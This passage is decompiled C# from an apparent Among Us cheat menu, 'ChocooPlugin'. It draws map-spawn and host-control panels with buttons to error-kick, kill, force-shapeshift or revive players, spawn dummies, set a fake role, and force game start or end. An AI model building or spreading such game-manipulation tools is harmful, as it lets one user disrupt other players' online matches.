      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.Label("Select Map:", new GUILayoutOption[1]
      {
        GUILayout.Width(80f)
      });
      GUILayout.Space(5f);
      for (int index = 0; index < this.mapNames.Length; ++index)
      {
        GUI.backgroundColor = ChocooPlugin.selectedMapId == index ? new Color(0.5f, 0.2f, 0.9f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
        if (GUILayout.Button(this.mapNames[index], new GUILayoutOption[1]
        {
          GUILayout.Height(30f)
        }))
          ChocooPlugin.selectedMapId = index;
        GUILayout.Space(3f);
      }
      GUILayout.Space(10f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("SPAWN MAP", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.SpawnMap(ChocooPlugin.selectedMapId);
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.8f, 0.3f, 0.2f, 1f);
      if (GUILayout.Button("DESPAWN MAP", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
        this.DespawnMap();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 0.7f, 1f);
      GUILayout.Label("Map Info", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = Color.gray;
      GUILayout.Label("• Spawn/Despawn lobby", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Spawn/Despawn meeting screen", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Choose map and spawn it", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("• Despawn current map", new GUIStyle(GUI.skin.label)
      {
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
    }

    private void DrawRolesTab()
    {
      // ISSUE: unable to decompile the method.
    }

    private void ApplyFakeRole()
    {
      try
      {
        if (!ChocooPlugin.OriginalRole.HasValue && Object.op_Inequality((Object) PlayerControl.LocalPlayer?.Data, (Object) null))
          ChocooPlugin.OriginalRole = new RoleTypes?(PlayerControl.LocalPlayer.Data.RoleType);
        PlayerControl localPlayer = PlayerControl.LocalPlayer;
        if (localPlayer != null && localPlayer.Data?.IsDead.GetValueOrDefault())
        {
          if (ChocooPlugin.SelectedFakeRole == 1 || ChocooPlugin.SelectedFakeRole == 5 || ChocooPlugin.SelectedFakeRole == 9 || ChocooPlugin.SelectedFakeRole == 18)
            DestroyableSingleton<RoleManager>.Instance.SetRole(PlayerControl.LocalPlayer, (RoleTypes) 7);
          else
            DestroyableSingleton<RoleManager>.Instance.SetRole(PlayerControl.LocalPlayer, (RoleTypes) 6);
        }
        else
          DestroyableSingleton<RoleManager>.Instance.SetRole(PlayerControl.LocalPlayer, ChocooPlugin.SelectedFakeRole);
        ChocooPlugin.Logger.LogInfo((object) ("Fake role set to: " + ChocooPlugin.SelectedFakeRole.ToString()));
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Failed to set fake role: " + ex.Message));
      }
    }

    private void DrawHostTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.0f);
      GUILayout.Label("Host Controls", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = this.activeHostSection == "Utils" ? new Color(1f, 0.5f, 0.0f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("⚙️ UTILS", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        this.activeHostSection = "Utils";
        this.focusedSettingKey = "";
        this.settingInputBuffer = "";
      }
      GUILayout.Space(10f);
      GUI.backgroundColor = this.activeHostSection == "Settings" ? new Color(0.3f, 0.7f, 1f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
      if (GUILayout.Button("\uD83C\uDFAE SETTINGS", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        this.activeHostSection = "Settings";
        this.settingsLoaded = false;
        this.focusedSettingKey = "";
        this.settingInputBuffer = "";
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(15f);
      if (this.activeHostSection == "Utils")
        this.DrawHostUtilsSection();
      else
        this.DrawHostSettingsSection();
    }

    private void DrawHostUtilsSection()
    {
      this.hostScrollPosition = GUILayout.BeginScrollView(this.hostScrollPosition, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.3f, 0.3f);
      GUILayout.Label("Kick / Ban Players", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("KICK", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.KickSelectedPlayer();
      GUILayout.Space(5f);
      if (GUILayout.Button("ERRORKICK", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ErrorKickSelectedPlayer();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("BAN", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.BanSelectedPlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("FORCE MEETING AS", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceMeetingAsPlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("KILL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.KillSelectedPlayer();
      GUI.enabled = true;
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("TELEKILL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.TelekillSelectedPlayer();
      GUI.enabled = true;
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button("KILL ALL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.KillAllPlayers();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("ADD TASKS", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
      {
        PlayerControl playerControl = (PlayerControl) null;
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
          {
            playerControl = cachedPlayer;
            break;
          }
        }
        if (Object.op_Inequality((Object) playerControl, (Object) null))
        {
          byte[] numArray = new byte[(int) byte.MaxValue];
          for (byte index = 0; index < byte.MaxValue; ++index)
            numArray[(int) index] = index;
          playerControl.Data.RpcSetTasks(new Il2CppStructArray<byte>(numArray));
        }
      }
      GUILayout.Space(5f);
      if (GUILayout.Button("REMOVE TASKS", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
      {
        PlayerControl playerControl = (PlayerControl) null;
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (Object.op_Inequality((Object) cachedPlayer, (Object) null) && Object.op_Inequality((Object) cachedPlayer.Data, (Object) null) && cachedPlayer.Data.ClientId == ChocooPlugin.selectedHostKickTargetId)
          {
            playerControl = cachedPlayer;
            break;
          }
        }
        if (Object.op_Inequality((Object) playerControl, (Object) null))
          playerControl.Data.RpcSetTasks(new Il2CppStructArray<byte>(Array.Empty<byte>()));
      }
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.8f, 0.0f);
      GUILayout.Label("Shapeshift Target:", new GUIStyle(GUI.skin.label)
      {
        fontSize = 12
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      if (GUILayout.Button(!Object.op_Inequality((Object) ChocooPlugin.selectedShapeshiftTarget, (Object) null) || !Object.op_Inequality((Object) ChocooPlugin.selectedShapeshiftTarget.Data, (Object) null) ? "Select Target" : ChocooPlugin.selectedShapeshiftTarget.Data.PlayerName, new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        ChocooPlugin.showShapeshiftTargetDropdown = !ChocooPlugin.showShapeshiftTargetDropdown;
      GUI.backgroundColor = Color.white;
      float dropdownHeight1 = this.GetDropdownHeight("shapeshift", ChocooPlugin.showShapeshiftTargetDropdown, 150f);
      if ((double) dropdownHeight1 > 1.0)
      {
        GUILayout.BeginVertical(GUI.skin.box, Array.Empty<GUILayoutOption>());
        GUILayout.BeginScrollView(Vector2.zero, new GUILayoutOption[1]
        {
          GUILayout.Height(dropdownHeight1)
        });
        foreach (PlayerControl cachedPlayer in this._cachedPlayers)
        {
          if (!Object.op_Equality((Object) cachedPlayer, (Object) null) && !Object.op_Equality((Object) cachedPlayer.Data, (Object) null) && GUILayout.Button(this.StripHtmlTags(cachedPlayer.Data.PlayerName), (Il2CppReferenceArray<GUILayoutOption>) null))
          {
            ChocooPlugin.selectedShapeshiftTarget = cachedPlayer;
            ChocooPlugin.selectedShapeshiftTargetId = cachedPlayer.Data.ClientId;
            ChocooPlugin.showShapeshiftTargetDropdown = false;
          }
        }
        GUILayout.EndScrollView();
        GUILayout.EndVertical();
      }
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1 && Object.op_Inequality((Object) ChocooPlugin.selectedShapeshiftTarget, (Object) null);
      if (GUILayout.Button("FORCE SHAPESHIFT", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceShapeshiftPlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      if (GUILayout.Button("UNSHIFT ALL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.UnshiftAll();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("FORCE VANISH", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceVanishPlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("FORCE SCAN", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceScanPlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.6f, 0.3f, 0.9f, 1f);
      GUI.enabled = Object.op_Inequality((Object) ChocooPlugin.selectedShapeshiftTarget, (Object) null);
      if (GUILayout.Button("SS ALL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceShapeshiftAll();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.6f, 0.3f, 0.9f, 1f);
      if (GUILayout.Button("VANISH ALL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceVanishAll();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.6f, 0.3f, 0.9f, 1f);
      if (GUILayout.Button("SCAN ALL", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ForceScanAll();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.5f, 0.3f, 0.7f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("TURN TO GHOST", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.TurnPlayerToGhost();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.8f, 0.3f, 1f);
      GUI.enabled = ChocooPlugin.selectedHostKickTargetId != -1;
      if (GUILayout.Button("REVIVE", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.RevivePlayer();
      GUI.enabled = true;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.5f, 0.8f, 1f);
      GUILayout.Label("\uD83D\uDC65 Dummy Management", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.contentColor = new Color(0.5f, 0.8f, 1f);
      GUILayout.Label("Number of Dummies:", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1,
        fontSize = 10
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
      if (GUILayout.Button($"▼ {this.selectedDummyCount} Dummies", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.showDummyCountDropdown = !this.showDummyCountDropdown;
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      float dropdownHeight2 = this.GetDropdownHeight("dummyCount", this.showDummyCountDropdown, 150f);
      if ((double) dropdownHeight2 > 1.0)
      {
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUILayout.BeginScrollView(Vector2.zero, new GUILayoutOption[1]
        {
          GUILayout.Height(dropdownHeight2)
        });
        for (int index = 1; index <= 10; ++index)
        {
          GUI.backgroundColor = this.selectedDummyCount == index ? new Color(0.5f, 0.8f, 1f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
          if (GUILayout.Button($"{index} Dummies", new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
          {
            this.selectedDummyCount = index;
            this.showDummyCountDropdown = false;
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
        GUILayout.EndScrollView();
        GUILayout.EndVertical();
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("SPAWN DUMMIES (SERVER SIDED)", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.SpawnDummies(this.selectedDummyCount);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.8f, 0.3f, 0.2f, 1f);
      if (GUILayout.Button("REMOVE DUMMIES", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.RemoveAllDummies();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      int count1 = CloneMgr.GetMyCloneIndices().Count;
      int count2 = CloneMgr.L.Count;
      if (count2 > 0)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.cyan;
        GUILayout.Label($"\uD83D\uDCCA Active Dummies: {count2}", new GUIStyle(GUI.skin.label)
        {
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.yellow;
        GUILayout.Label($"Your Dummies: {count1}", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      this.hostKickPlayerScrollPosition = GUILayout.BeginScrollView(this.hostKickPlayerScrollPosition, new GUILayoutOption[1]
      {
        GUILayout.Height(120f)
      });
      foreach (PlayerControl cachedPlayer in this._cachedPlayers)
      {
        if (Object.op_Inequality((Object) cachedPlayer, (Object) null))
        {
          string str = this.StripHtmlTags(cachedPlayer.Data?.PlayerName) ?? "Unknown";
          NetworkedPlayerInfo data = cachedPlayer.Data;
          int num = data != null ? data.ClientId : -1;
          GUI.backgroundColor = ChocooPlugin.selectedHostKickTargetId == num ? new Color(1f, 0.5f, 0.0f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
          if (GUILayout.Button(str, new GUILayoutOption[1]
          {
            GUILayout.Height(25f)
          }))
            ChocooPlugin.selectedHostKickTargetId = num;
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
      }
      GUILayout.EndScrollView();
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      int num1;
      if (Object.op_Inequality((Object) ShipStatus.Instance, (Object) null))
      {
        AmongUsClient instance = AmongUsClient.Instance;
        num1 = instance != null ? (((InnerNetClient) instance).GameState == 2 ? 1 : 0) : 0;
      }
      else
        num1 = 0;
      bool flag = num1 != 0;
      this.DrawToggleSwitch("Randomize Outfit", ref ChocooPlugin.RandomizeOutfit);
      this.DrawToggleSwitch("Ban Blacklists", ref ChocooPlugin.BanBlacklistedEnabled);
      if (!flag)
      {
        GUI.enabled = false;
        this.DrawToggleSwitch("Keep Protecting All", ref ChocooPlugin.KeepProtectingAllEnabled);
        GUI.enabled = true;
      }
      else
        this.DrawToggleSwitch("Keep Protecting All", ref ChocooPlugin.KeepProtectingAllEnabled);
      if (!flag && ChocooPlugin.KeepProtectingAllEnabled)
        ChocooPlugin.KeepProtectingAllEnabled = false;
      this.DrawToggleSwitch("Show Lobby Timer", ref ChocooPlugin.ShowLobbyTimerEnabled);
      this.DrawToggleSwitch("Disable Votekicks", ref ChocooPlugin.DisableVotekicks);
      this.DrawToggleSwitch("Disable Meetings", ref ChocooPlugin.DisableMeetings);
      this.DrawToggleSwitch("Disable Sabotages", ref ChocooPlugin.DisableSabotagesEnabled);
      this.DrawToggleSwitch("Task Speedrun Mode", ref ChocooPlugin.TaskSpeedrunEnabled);
      if (!flag)
      {
        GUI.enabled = false;
        this.DrawToggleSwitch("God Mode", ref ChocooPlugin.GodModeEnabled);
        GUI.enabled = true;
      }
      else
        this.DrawToggleSwitch("God Mode", ref ChocooPlugin.GodModeEnabled);
      if (!flag && ChocooPlugin.GodModeEnabled)
        ChocooPlugin.GodModeEnabled = false;
      this.DrawToggleSwitch("Disable Game End", ref ChocooPlugin.DisableGameEndEnabled);
      GUILayout.Space(10f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      if (GUILayout.Button("⚙️ FORCE ROLES", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.ShowForceRolesMenu = !ChocooPlugin.ShowForceRolesMenu;
        ChocooPlugin.showRoleDropdown = false;
        ChocooPlugin.dropdownPlayerIndex = -1;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.9f, 1f);
      if (GUILayout.Button("\uD83C\uDFA8 FORCE COLOR", new GUILayoutOption[1]
      {
        GUILayout.Height(40f)
      }))
      {
        ChocooPlugin.ShowForceColorMenu = !ChocooPlugin.ShowForceColorMenu;
        ChocooPlugin.showColorDropdown = false;
        ChocooPlugin.dropdownPlayerIndexColor = -1;
      }
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      if (ChocooPlugin.forcedColors.Count > 0)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.green;
        GUILayout.Label($"✓ {ChocooPlugin.forcedColors.Count.ToString()} Colors Assigned", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      if (ChocooPlugin.forcedRoles.Count > 0)
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.green;
        GUILayout.Label($"✓ {ChocooPlugin.forcedRoles.Count.ToString()} Roles Assigned", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 10,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.5f, 0.2f, 0.9f, 1f);
      if (GUILayout.Button("FORCE START GAME", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }) && Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
        AmongUsClient.Instance.StartGame();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(3f);
      GUI.backgroundColor = new Color(0.9f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button("FORCE END GAME", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.ForceEndGame();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
      if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && !((InnerNetClient) AmongUsClient.Instance).AmHost)
      {
        GUI.contentColor = Color.yellow;
        GUILayout.Label("(Host features active when hosting)", new GUIStyle(GUI.skin.label)
        {
          alignment = (TextAnchor) 4,
          fontSize = 10
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost && (ChocooPlugin.DisableVotekicks || ChocooPlugin.DisableMeetings))
      {
        GUILayout.Space(5f);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = new Color(1f, 0.5f, 0.0f);
        GUILayout.Label("Active Protections", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = Color.gray;
        if (ChocooPlugin.DisableVotekicks)
          GUILayout.Label("\uD83D\uDEE1️ Votekick Protection ON", new GUIStyle(GUI.skin.label)
          {
            fontSize = 10
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
        if (ChocooPlugin.DisableMeetings)
          GUILayout.Label("\uD83D\uDEAB Meeting Lock ON", new GUIStyle(GUI.skin.label)
          {
            fontSize = 10
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.EndScrollView();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUI.contentColor = Color.white;
    }

    private void DrawHostSettingsSection()
    {
      bool flag = Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).AmHost;
      if (!flag)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.yellow;
        GUILayout.Label("⚠️ Must be Host to change settings", new GUIStyle(GUI.skin.label)
        {
          fontStyle = (FontStyle) 1,
          fontSize = 11,
          alignment = (TextAnchor) 4
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
        GUILayout.Space(5f);
      }
      if (!string.IsNullOrEmpty(this.focusedSettingKey) && this.settingsBoxFocused && Event.current.type == 0)
      {
        this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
        this.focusedSettingKey = "";
        this.settingInputBuffer = "";
        this.settingsBoxFocused = false;
      }
      if (!this.settingsLoaded)
      {
        this.LoadSettingsFromGame();
        this.settingsLoaded = true;
      }
      if (string.IsNullOrEmpty(this.focusedSettingKey))
      {
        this._settingsSyncTimer += Time.deltaTime;
        if ((double) this._settingsSyncTimer >= 1.0)
        {
          this._settingsSyncTimer = 0.0f;
          IGameOptions currentGameOptions = GameOptionsManager.Instance?.CurrentGameOptions;
          if (currentGameOptions != null)
          {
            this.s_emergencyMeetings = (float) currentGameOptions.GetInt((Int32OptionNames) 3);
            this.s_emergencyCooldown = (float) currentGameOptions.GetInt((Int32OptionNames) 4);
            this.s_discussionTime = (float) currentGameOptions.GetInt((Int32OptionNames) 5);
            this.s_votingTime = (float) currentGameOptions.GetInt((Int32OptionNames) 6);
            this.s_killDistance = (float) currentGameOptions.GetInt((Int32OptionNames) 2);
            this.s_taskBarMode = (float) currentGameOptions.GetInt((Int32OptionNames) 13);
            this.s_commonTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 10);
            this.s_shortTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 11);
            this.s_longTasks = (float) currentGameOptions.GetInt((Int32OptionNames) 12);
            this.s_playerSpeed = currentGameOptions.GetFloat((FloatOptionNames) 2);
            this.s_crewVision = currentGameOptions.GetFloat((FloatOptionNames) 4);
            this.s_impVision = currentGameOptions.GetFloat((FloatOptionNames) 3);
